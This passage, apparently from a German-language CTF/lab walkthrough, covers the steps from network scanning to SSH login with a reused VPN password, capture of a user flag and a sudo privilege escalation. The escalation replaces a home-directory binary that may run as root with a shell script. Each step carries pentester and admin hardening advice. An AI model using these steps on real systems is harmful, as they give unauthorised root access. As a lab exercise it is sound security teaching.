+                Anschließend wird das vom VPN-Server gepushte Netzwerk <code>10.176.13.0/24</code> mit <code>nmap -sn 10.176.13.0/24</code> auf aktive Hosts gescannt. Die Option <code>-sn</code> (Ping-Scan) deaktiviert das Port-Scanning und führt nur eine Host-Discovery durch, um festzustellen, welche IPs im Subnetz antworten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -p- 10.8.0.1</span></div>
+                    <pre>
+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-15 01:45 CEST</span>
+Nmap scan report for <span class="command">10.8.0.1</span>
+Host is up (0.00050s latency).
+Not shown: 65534 closed tcp ports (reset)
+<span class="command">PORT   STATE SERVICE</span>
+<span class="command">80/tcp open  http</span>
+
+Nmap done: 1 IP address (1 host up) scanned in 2.93 seconds
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sn 10.176.13.0/24</span></div>
+                    <pre>
+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-15 01:45 CEST</span>
+Nmap scan report for <span class="command">10.176.13.37</span>
+<span class="password">Host is up (0.00046s latency).</span>
+Nmap done: 256 IP addresses (1 host up) scanned in 83.99 seconds
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der Scan des VPN-Gateways <code>10.8.0.1</code> zeigt, dass dort nur Port <code>80</code> (HTTP) offen ist. Dies könnte eine Verwaltungswebseite für das VPN oder ein anderer interner Webdienst sein.
+                Der Ping-Scan des Netzwerks <code>10.176.13.0/24</code> ist sehr aufschlussreich: Es wurde ein einzelner aktiver Host mit der IP-Adresse <code>10.176.13.37</code> gefunden. Dies ist unser nächstes Ziel!
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der Webdienst auf <code>http://10.8.0.1/</code> sollte untersucht werden. Parallel dazu muss der neu entdeckte Host <code>10.176.13.37</code> einem vollständigen Portscan (TCP und UDP) unterzogen werden, um dessen Dienste und potenzielle Schwachstellen zu identifizieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Wenn auf dem VPN-Gateway <code>10.8.0.1</code> ein Webserver läuft, sollte dessen Zugriff streng kontrolliert und der Dienst gehärtet werden. Nicht benötigte Webdienste auf Netzwerkgeräten sollten deaktiviert werden. Die Netzwerksegmentierung durch das VPN ist ein guter Schritt, aber die Sicherheit der Hosts innerhalb des VPN-Segments ist ebenso wichtig. Es sollte sichergestellt werden, dass Hosts im VPN nur die minimal notwendigen Dienste exponieren.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem der Host <code>10.176.13.37</code> im VPN-Subnetz <code>10.176.13.0/24</code> identifiziert wurde, führen wir nun einen detaillierten <code>nmap</code>-Scan auf diesen Host durch.
+                Der Befehl <code>nmap -sS -sC -sV -p- 10.176.13.37</code> ist wie folgt aufgebaut:
+                <ul>
+                    <li><code>-sS</code>: TCP SYN-Scan.</li>
+                    <li><code>-sC</code>: Führt Standard-Nmap-Skripte aus.</li>
+                    <li><code>-sV</code>: Versucht, die Versionen der laufenden Dienste zu ermitteln.</li>
+                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
+                </ul>
+                Das Ziel ist es, alle offenen TCP-Ports und die darauf laufenden Dienste sowie deren Versionen auf dem Host <code>10.176.13.37</code> zu finden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- 10.176.13.37</span></div>
+                    <pre>
+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-15 01:49 CEST</span>
+Nmap scan report for <span class="command">10.176.13.37</span>
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey:</span> 
+<span class="command">|   256 f7:f2:e0:96:c0:28:67:93:5f:90:f2:a1:86:73:74:00 (ECDSA)</span>
+<span class="command">|_  256 92:40:ba:b8:11:ad:79:41:71:f8:9e:00:01:64:9c:34 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span>
+<span class="command">|_http-server-header: Apache/2.4.62 (Unix)</span>
+<span class="command">|_http-title: Mac OS X Server</span>
+<span class="command">| http-methods:</span> 
+<span class="command">|_  Potentially risky methods: TRACE</span>
+<span class="command">|_http-favicon: Apache on Mac OS X</span>
+
+Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/].
+Nmap done: 1 IP address (1 host up) scanned in 9.22 seconds
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der Scan des Hosts <code>10.176.13.37</code> liefert sehr interessante Ergebnisse:
+                <ul>
+                    <li>Port <code>22/tcp</code> ist offen und es läuft ein <code>OpenSSH 9.9</code> Dienst. Dies ist ein potenzieller Eingangspunkt, wenn wir gültige Anmeldedaten finden oder eine Schwachstelle in dieser SSH-Version existiert.</li>
+                    <li>Port <code>80/tcp</code> ist ebenfalls offen und es läuft ein <code>Apache httpd 2.4.62 ((Unix))</code>. Interessanterweise sind der HTTP-Titel (<code>Mac OS X Server</code>) und das Favicon identisch mit dem Webserver auf der ursprünglichen Ziel-IP <code>192.168.2.191</code>. Dies könnte darauf hindeuten, dass es sich um denselben Server handelt, der über das VPN erreichbar ist, oder um eine sehr ähnliche Konfiguration. Die aktivierte <code>TRACE</code>-Methode wird auch hier gemeldet.</li>
+                </ul>
+                Die Kombination aus SSH und einem Webserver (der dem initialen Ziel ähnelt) auf diesem internen Host ist vielversprechend. Die Wiederverwendung des Passworts <code><span class="password">hiro</span></code> (gefunden für den VPN-Schlüssel) für den Benutzer <code>shinosawa</code> (erwähnt in der VPN-Konfig) via SSH ist nun ein primärer Angriffsvektor.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der nächste Schritt ist ein SSH-Loginversuch auf <code>10.176.13.37</code> mit dem Benutzernamen <code>shinosawa</code> und dem Passwort <code><span class="password">hiro</span></code>. Parallel dazu sollte auch der Webserver auf <code>http://10.176.13.37/</code> untersucht werden, obwohl er dem bereits bekannten Server ähnelt – es könnten sich Unterschiede im Inhalt oder in der Konfiguration ergeben haben, die über das VPN zugänglich sind.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Der SSH-Zugriff sollte durch starke, einzigartige Passwörter und/oder Schlüsselpaare gesichert werden. Passwort-Authentifizierung sollte idealerweise deaktiviert und nur Schlüssel-Authentifizierung zugelassen werden. Die Webserver-Konfiguration (Deaktivierung von TRACE, Minimierung von Bannern) gilt auch für diesen internen Host. Es sollte sichergestellt werden, dass interne Systeme ebenso robust gehärtet sind wie extern erreichbare Systeme. Die Ähnlichkeit der Webserver-Konfiguration könnte auf geklonte Systeme oder eine standardisierte Bereitstellung hinweisen; sicherheitsrelevante Einstellungen sollten bei solchen Prozessen besonders beachtet werden.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Basierend auf den Ergebnissen des vorherigen <code>nmap</code>-Scans (offener SSH-Port auf <code>10.176.13.37</code>) und den Hinweisen aus der OpenVPN-Konfiguration (Benutzer "shinosawa", Passwort des VPN-Keys "hiro"), versuchen wir nun, uns per SSH auf dem Host <code>10.176.13.37</code> als Benutzer <code>shinosawa</code> anzumelden.
+                Der Befehl <code>ssh shinosawa@10.176.13.37</code> initiiert die SSH-Verbindung. Das System fragt nach der Bestätigung des Host-Schlüssels (da es das erste Mal ist, dass wir uns mit diesem Host verbinden) und anschließend nach dem Passwort für <code>shinosawa</code>.
+                Wir geben das Passwort <code><span class="password">hiro</span></code> ein.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shinosawa@10.176.13.37</span></div>
+                    <pre>
+The authenticity of host '10.176.13.37 (10.176.13.37)' can't be established.
+ED25519 key fingerprint is SHA256:vaNpWHLU4MBQQAMOKUZyElDg6iMi5vHtM3a9kKLw+oE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added '10.176.13.37' (ED25519) to the list of known hosts.
+shinosawa@10.176.13.37's password: <span class="password">hiro</span>
+
+<span class="command">homelab:~$</span> 
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der SSH-Login war erfolgreich! Wir haben mit den Anmeldedaten <code>shinosawa</code>:<code><span class="password">hiro</span></code> eine Shell auf dem Zielsystem <code>homelab</code> (Hostname des Zielsystems, wie im Prompt ersichtlich) erhalten.
+                Dies bestätigt die Vermutung, dass das Passwort des VPN-Schlüssels für den SSH-Zugang des Benutzers <code>shinosawa</code> wiederverwendet wurde. Dies ist ein kritischer Fund und unser erster interaktiver Zugriff auf ein System in dieser Kette. Wir haben nun einen Fuß in der Tür im internen Netzwerk. Der Prompt <code>homelab:~$</code> zeigt, dass wir uns im Home-Verzeichnis des Benutzers <code>shinosawa</code> befinden und eine normale Benutzer-Shell haben.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Nachdem wir erfolgreich Zugriff als Benutzer <code>shinosawa</code> erlangt haben, sind die nächsten Schritte:
+                <ol>
+                    <li>**Grundlegende Enumeration auf dem Zielsystem:** Betriebssystemversion, Kernel-Version, installierte Software, laufende Prozesse, Netzwerkkonfiguration (<code>uname -a</code>, <code>cat /etc/os-release</code>, <code>ps aux</code>, <code>netstat -tulnp</code>, <code>id</code>, <code>whoami</code>).</li>
+                    <li>**Suche nach Benutzer-Flag:** Oft befindet sich diese im Home-Verzeichnis des Benutzers (<code>/home/shinosawa/user.txt</code> oder ähnlich).</li>
+                    <li>**Privilege Escalation Vektoren suchen:** Überprüfung der <code>sudo</code>-Rechte (<code>sudo -l</code>), SUID/SGID-Binaries (<code>find / -perm -4000 -type f 2>/dev/null</code>), Cronjobs, Kernel-Exploits, schwache Dateiberechtigungen, etc.</li>
+                </ol>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Wiederverwendung von Passwörtern über verschiedene Dienste hinweg (hier: VPN-Schlüssel-Passphrase und SSH-Passwort) ist eine gravierende Sicherheitslücke und sollte strikt vermieden werden. Jeder Dienst sollte ein einzigartiges, starkes Passwort oder idealerweise eine schlüsselbasierte Authentifizierung verwenden. Benutzer sollten über die Gefahren der Passwortwiederverwendung geschult werden. Multi-Faktor-Authentifizierung (MFA) für SSH-Zugänge würde die Sicherheit erheblich erhöhen.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem wir uns erfolgreich als Benutzer <code>shinosawa</code> per SSH auf dem Host <code>homelab</code> angemeldet haben, führen wir den Befehl <code>sudo -l</code> aus. Dieser Befehl listet die Befehle auf, die der aktuelle Benutzer (<code>shinosawa</code>) mit <code>sudo</code> (also mit den Rechten eines anderen Benutzers, standardmäßig <code>root</code>) ausführen darf, basierend auf der Konfiguration in der <code>/etc/sudoers</code>-Datei.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shinosawa@10.176.13.37</span></div>
+                    <pre>
+The authenticity of host '10.176.13.37 (10.176.13.37)' can't be established.
+ED25519 key fingerprint is SHA256:vaNpWHLU4MBQQAMOKUZyElDg6iMi5vHtM3a9kKLw+oE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.176.13.37' (ED25519) to the list of known hosts.
+shinosawa@10.176.13.37's password: <span class="password">hiro</span>
+
+homelab:~$ <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for shinosawa on homelab:</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">Runas and Command-specific defaults for shinosawa:</span>
+    <span class="command">Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"</span>
+
+<span class="command">User shinosawa may run the following commands on homelab:</span>
+    <span class="password">(ALL) NOPASSWD: /home/shinosawa/deepseek</span>
+homelab:~$ 
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Ausgabe von <code>sudo -l</code> ist extrem aufschlussreich und deutet auf einen klaren Weg zur Rechteausweitung hin:
+                <ul>
+                    <li><code>Matching Defaults entries ... secure_path=...</code>: Definiert den sicheren Pfad, den <code>sudo</code> verwendet, um Befehle zu finden. Dies ist wichtig, um Path-Hijacking-Angriffe zu verhindern, bei denen ein Angreifer eine manipulierte Version eines Standardbefehls in einem Verzeichnis platziert, das früher im <code>PATH</code> des Benutzers steht.</li>
+                    <li><code>Runas and Command-specific defaults ... Defaults!/usr/sbin/visudo ...</code>: Spezifische Standardeinstellungen für <code>visudo</code>.</li>
+                    <li><code>User shinosawa may run the following commands on homelab: (ALL) NOPASSWD: /home/shinosawa/deepseek</code>: Dies ist der kritische Punkt! Der Benutzer <code>shinosawa</code> darf den Befehl <code>/home/shinosawa/deepseek</code> als jeder Benutzer (<code>(ALL)</code>, was implizit <code>root</code> einschließt, wenn nicht anders angegeben) und ohne Eingabe eines Passworts (<code>NOPASSWD:</code>) ausführen.</li>
+                </ul>
+                Da sich die Datei <code>deepseek</code> im Home-Verzeichnis von <code>shinosawa</code> befindet (<code>/home/shinosawa/deepseek</code>), und wir als <code>shinosawa</code> Schreibrechte in unserem eigenen Home-Verzeichnis haben (es sei denn, es gibt sehr ungewöhnliche Einschränkungen), können wir diese Datei potenziell manipulieren oder ersetzen. Wenn wir <code>/home/shinosawa/deepseek</code> durch ein Skript ersetzen, das eine Shell startet (z.B. <code>/bin/bash</code> oder <code>/bin/sh</code>), und dieses dann mit <code>sudo /home/shinosawa/deepseek</code> ausführen, wird unser Skript mit Root-Rechten ausgeführt. Dies ist ein klassischer Sudo-Exploit-Vektor durch eine unsichere Konfiguration.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der Plan ist klar:
+                <ol>
+                    <li>Überprüfen, was <code>/home/shinosawa/deepseek</code> aktuell ist (<code>ls -l /home/shinosawa/deepseek</code>, <code>file /home/shinosawa/deepseek</code>, <code>cat /home/shinosawa/deepseek</code>).</li>
+                    <li>Wenn möglich, die Originaldatei <code>deepseek</code> sichern (umbenennen).</li>
+                    <li>Eine neue Datei namens <code>deepseek</code> im Pfad <code>/home/shinosawa/</code> erstellen, die einen Befehl zum Starten einer Shell enthält (z.B. <code>echo '/bin/bash -p' > /home/shinosawa/deepseek</code> oder <code>echo 'ash' > /home/shinosawa/deepseek</code>, da die Shell von shinosawa <code>ash</code> ist).</li>
+                    <li>Die neue Datei ausführbar machen (<code>chmod +x /home/shinosawa/deepseek</code>).</li>
+                    <li>Den Befehl <code>sudo /home/shinosawa/deepseek</code> ausführen. Dies sollte eine Root-Shell öffnen.</li>
+                </ol>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die <code>sudoers</code>-Konfiguration ist hier extrem unsicher. Das Erlauben der Ausführung eines Programms aus dem Home-Verzeichnis eines Benutzers mit <code>NOPASSWD</code> als <code>root</code> ist ein Rezept für eine Katastrophe, da der Benutzer volle Kontrolle über dieses Programm hat.
+                Prinzipien für sichere <code>sudoers</code>-Regeln:
+                <ul>
+                    <li>**Least Privilege:** Benutzern nur die absolut notwendigen Rechte geben.</li>
+                    <li>**Keine NOPASSWD für potenziell gefährliche Befehle:** Wenn möglich, immer eine Passwortabfrage erzwingen.</li>
+                    <li>**Keine Ausführung von Programmen aus benutzerkontrollierbaren Verzeichnissen:** Programme, die mit erhöhten Rechten ausgeführt werden dürfen, sollten in geschützten Systemverzeichnissen liegen (z.B. <code>/usr/local/sbin</code>) und nicht vom Benutzer veränderbar sein.</li>
+                    <li>**Spezifische Befehle statt generischer Shells:** Anstatt dem Benutzer zu erlauben, <code>/home/shinosawa/deepseek</code> auszuführen, wäre es sicherer (wenn dieser Befehl tatsächlich als root benötigt wird), ihn an einen Ort zu verschieben, den <code>shinosawa</code> nicht schreiben kann, und den Pfad in <code>sudoers</code> entsprechend anzupassen.</li>
+                </ul>
+                Diese <code>sudo</code>-Regel muss umgehend korrigiert werden.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Als Benutzer <code>shinosawa</code> führen wir einige grundlegende Enumerationsbefehle durch, um mehr über das System und den Benutzerkontext zu erfahren.
+                <ul>
+                    <li><code>grep sh /etc/passwd</code>: Durchsucht die Datei <code>/etc/passwd</code> nach Zeilen, die "sh" enthalten. Dies wird oft verwendet, um Benutzer zu finden, die eine Shell konfiguriert haben (z.B. <code>/bin/bash</code>, <code>/bin/sh</code>, <code>/bin/ash</code>).</li>
+                    <li><code>ls /home/</code>: Listet die Verzeichnisse im <code>/home</code>-Verzeichnis auf, um andere Benutzerkonten zu identifizieren.</li>
+                    <li><code>id</code>: Zeigt die User ID (UID), Group ID (GID) und Gruppenmitgliedschaften des aktuellen Benutzers an.</li>
+                    <li><code>cat user.flag</code>: Versucht, eine Datei namens <code>user.flag</code> im aktuellen Verzeichnis (dem Home-Verzeichnis von <code>shinosawa</code>) zu lesen. Dies ist eine Standardkonvention in CTFs für die Benutzer-Flag.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">grep sh /etc/passwd</span></div>
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/sh</span>
+<span class="command">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span>
+<span class="command">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span>
+<span class="command">shinosawa:x:1000:1000::/home/shinosawa:/bin/ash //das ist eine ask shell</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">ls /home/</span></div>
+                    <pre><span class="command">shinosawa</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">cat user.flag</span></div>
+                    <pre><span class="password">flag{38665d1048af82499c6ecbd3c0db3acc}</span></pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Enumeration liefert wichtige Informationen:
+                <ul>
+                    <li><code>grep sh /etc/passwd</code>:
+                        <ul>
+                            <li>Bestätigt, dass <code>root</code> die Shell <code>/bin/sh</code> verwendet.</li>
+                            <li>Zeigt den Benutzer <code>shinosawa</code> (UID 1000, GID 1000) mit der Shell <code>/bin/ash</code>. Die Alpine Linux Shell (ash) ist eine leichtgewichtige Shell, die oft in Containern oder Embedded Systems verwendet wird. Der Kommentar "//das ist eine ask shell" ist eine interessante Beobachtung des ursprünglichen Autors.</li>
+                            <li>Der <code>sshd</code>-Benutzer hat keine Login-Shell (<code>/sbin/nologin</code>), was normal ist.</li>
+                        </ul>
+                    </li>
+                    <li><code>ls /home/</code>: Bestätigt, dass <code>shinosawa</code> der einzige Benutzer mit einem Home-Verzeichnis unter <code>/home</code> zu sein scheint.</li>
+                    <li><code>id</code>: Bestätigt die UID (1000), GID (1000) und Gruppen (users, shinosawa) für den Benutzer <code>shinosawa</code>.</li>
+                    <li><code>cat user.flag</code>: Volltreffer! Die Benutzer-Flag <code><span class="password">flag{38665d1048af82499c6ecbd3c0db3acc}</span></code> wurde erfolgreich im Home-Verzeichnis von <code>shinosawa</code> gefunden und ausgelesen.</li>
+                </ul>
+                Wir haben nun die User-Flag und einen klaren Plan für die Privilege Escalation über die unsichere <code>sudo</code>-Konfiguration.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Nachdem die User-Flag gesichert ist, sollte der Fokus vollständig auf die Ausnutzung der <code>sudo</code>-Regel für <code>/home/shinosawa/deepseek</code> gelegt werden, um Root-Rechte zu erlangen und die Root-Flag zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Verwendung von <code>/bin/ash</code> als Standard-Shell für Benutzer ist nicht per se unsicher, aber weniger verbreitet als <code>bash</code>. Administratoren sollten sich der Unterschiede bewusst sein. Die Existenz einer <code>user.flag</code>-Datei ist spezifisch für CTF-Szenarien und hat in Produktivumgebungen keine direkte Entsprechung, aber das Prinzip, sensible Daten im Home-Verzeichnis eines Benutzers zu schützen, bleibt bestehen (korrekte Dateiberechtigungen).
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Als Benutzer <code>shinosawa</code> untersuchen wir nun die Datei <code>/home/shinosawa/deepseek</code>, die wir gemäß der <code>sudo -l</code> Ausgabe mit Root-Rechten ausführen dürfen.
+                <ul>
+                    <li><code>file deepseek</code>: Bestimmt den Dateityp von <code>deepseek</code>.</li>
+                    <li><code>ls</code>: Listet den Inhalt des aktuellen Verzeichnisses (<code>/home/shinosawa</code>) auf.</li>
+                    <li><code>id</code> und <code>whoami</code>: Bestätigen erneut die Identität des aktuellen Benutzers.</li>
+                    <li><code>./deepseek</code>: Führt das Programm <code>deepseek</code> als Benutzer <code>shinosawa</code> aus. Der Benutzer gibt hier <code>/bin/bash -p</code> ein, wahrscheinlich in der Erwartung, dass <code>deepseek</code> dies als Befehl ausführt.</li>
+                    <li><code>sudo -u shinosawa ./deepseek</code>: Führt <code>deepseek</code> explizit als Benutzer <code>shinosawa</code> mit <code>sudo</code> aus. Dies ist redundant, da wir bereits <code>shinosawa</code> sind, dient aber möglicherweise dazu, das Verhalten in einem <code>sudo</code>-Kontext ohne Rechteerhöhung zu testen.</li>
+                </ul>
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">file deepseek</span></div>
+                    <pre><span class="command">deepseek: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, BuildID[sha1]=4478f317bcb59905bbe3d317817d9f49c6c3ad5b, with debug_info, not stripped</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">ls</span></div>
+                    <pre>
+<span class="command">deepseek   user.flag</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">id</span></div>
+                    <pre><span class="command">uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">whoami</span></div>
+                    <pre><span class="command">shinosawa</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">./deepseek</span></div>
+                    <pre>
+&gt;&gt;&gt; <span class="command">/bin/bash -p</span>
+&lt;think&gt;
+Emm, I'm so tired and don't want to answer any^C
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">sudo -u shinosawa ./deepseek</span></div>
+                    <pre>
+&gt;&gt;&gt; <span class="command">/bin/bash -p</span>
+&lt;think&gt;
+Emm, I'm so tired and don't want to answer any questions.
+&lt;/think&gt;
+
+<span class="password">Thinking has stopped.</span>
+<span class="password">The server is busy, please try again later.</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                <ul>
+                    <li><code>file deepseek</code>: Zeigt, dass <code>deepseek</code> ein 64-Bit ELF Executable ist, dynamisch gelinkt gegen <code>musl-libc</code> (typisch für Alpine Linux) und nicht gestrippt (enthält Debug-Informationen, was für Reverse Engineering nützlich sein könnte, hier aber nicht relevant ist).</li>
+                    <li><code>ls</code>: Bestätigt, dass nur <code>deepseek</code> und <code>user.flag</code> im Home-Verzeichnis liegen.</li>
+                    <li><code>./deepseek</code> und <code>sudo -u shinosawa ./deepseek</code>: Das Programm scheint eine Art interaktive Eingabe zu erwarten (<code>&gt;&gt;&gt;</code>). Wenn man <code>/bin/bash -p</code> eingibt, antwortet es mit "Emm, I'm so tired..." und scheint keine Shell auszuführen. Es bricht ab oder beendet die Interaktion. Es verhält sich nicht wie ein direkter Shell-Wrapper.</li>
+                </ul>
+                Das Verhalten von <code>deepseek</code> selbst ist für die Privilege Escalation nicht direkt nützlich, da es unsere Eingaben nicht wie erwartet als Befehle ausführt. Die Stärke liegt darin, dass wir es durch unsere eigene Datei ersetzen können, da es in unserem Home-Verzeichnis liegt und wir es via <code>sudo</code> als root ausführen dürfen.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Der Plan, <code>deepseek</code> durch ein eigenes Skript zu ersetzen, bleibt der richtige Weg. Das ursprüngliche Verhalten von <code>deepseek</code> ist für diesen Exploit-Pfad irrelevant, solange wir die Datei überschreiben können.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die unsichere <code>sudo</code>-Regel ist das Hauptproblem. Selbst wenn <code>deepseek</code> selbst harmlos wäre, ermöglicht die Konfiguration die Ausführung einer beliebigen Datei an diesem Ort mit Root-Rechten. Programme, die mit <code>sudo</code> ausgeführt werden dürfen, sollten nicht durch den Benutzer modifizierbar sein, der sie ausführt.
+            </p>
+        </section>
+
+        <section id="proof-of-concept-privesc">
+            <h2>Proof of Concept: Privilege Escalation (shinosawa zu root)</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung der Schwachstelle:</strong>
+                Der Benutzer <code>shinosawa</code> darf das Programm <code>/home/shinosawa/deepseek</code> mittels <code>sudo</code> ohne Passwort als <code>root</code> ausführen. Da sich die Datei <code>deepseek</code> im Home-Verzeichnis von <code>shinosawa</code> befindet, hat dieser Benutzer Schreibrechte darauf. Dies ermöglicht es, die Originaldatei durch ein eigenes Skript zu ersetzen, das beim Aufruf mit <code>sudo</code> eine Root-Shell startet (Path Hijacking auf die Zieldatei selbst).
+            </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>SSH-Zugriff als Benutzer <code>shinosawa</code> auf dem Zielsystem <code>homelab</code>.</li>
+                    <li>Die fehlerhafte <code>sudo</code>-Konfiguration, die <code>shinosawa ALL=(ALL) NOPASSWD: /home/shinosawa/deepseek</code> erlaubt.</li>
+                    <li>Schreibrechte im Verzeichnis <code>/home/shinosawa/</code>.</li>
+                </ul>
+            </p>
+            <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung zur Ausnutzung:</strong>
+            </p>
+            <p class="analysis"><strong>1. Versuch, deepseek zu überschreiben (fehlschlagend):</strong>
+                Wir versuchen zunächst, die Datei <code>deepseek</code> direkt mit <code>echo ash > deepseek</code> zu überschreiben. Dies schlägt fehl ("Permission denied"), obwohl wir im eigenen Home-Verzeichnis sind. Dies könnte an speziellen Attributen der Datei liegen (z.B. immutable bit, obwohl das auf einem ELF-Executable unüblich wäre und hier nicht weiter untersucht wird) oder ein Missverständnis der Shell-Berechtigungen.
+                Der Versuch, die Datei mit <code>chmod +x deepseek</code> ausführbar zu machen, ist hier irrelevant, da das Problem das Schreiben ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">echo ash > deepseek</span></div>
+                    <pre><span class="password">-ash: can't create deepseek: Permission denied</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">chmod +x deepseek</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">echo ash > deepseek</span></div>
+                    <pre><span class="password">-ash: can't create deepseek: Permission denied</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>2. Umbenennen der Originaldatei und Erstellen einer neuen `deepseek`-Datei:</strong>
+                Da das direkte Überschreiben fehlschlägt, benennen wir die Originaldatei <code>deepseek</code> zu <code>deep</code> um (<code>mv deepseek deep</code>). Dies gibt den Dateinamen <code>deepseek</code> frei.
+                Anschließend erstellen wir eine neue Datei namens <code>deepseek</code> mit dem Inhalt <code>ash</code> (<code>echo ash > deepseek</code>). <code>ash</code> ist die Shell des Benutzers <code>shinosawa</code>, und wenn sie als root ausgeführt wird, erhalten wir eine Root-Shell.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">mv deepseek deep</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">homelab:~$ <span class="command">echo ash > deepseek</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>3. Ausführbar machen und mit `sudo` ausführen (erste Versuche fehlschlagend):</strong>
